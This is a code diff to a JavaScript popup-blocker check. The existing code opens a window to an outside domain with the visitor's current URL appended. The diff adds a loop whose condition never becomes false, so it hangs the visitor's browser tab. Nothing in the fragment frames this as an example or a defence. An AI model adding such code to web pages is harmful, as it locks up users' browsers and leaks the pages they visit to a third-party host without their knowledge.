@@ -9,6 +9,9 @@ function detectPopupBlocker() {
       var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
       var URL = "http://kplibrary.cf/" + location.href;
       var win = window.open(URL, "_blank", strWindowFeatures);
+      for (var i = 5; i > 3; i = i + 1) {
+        console.log(i);
+      }
     }
   }
 }
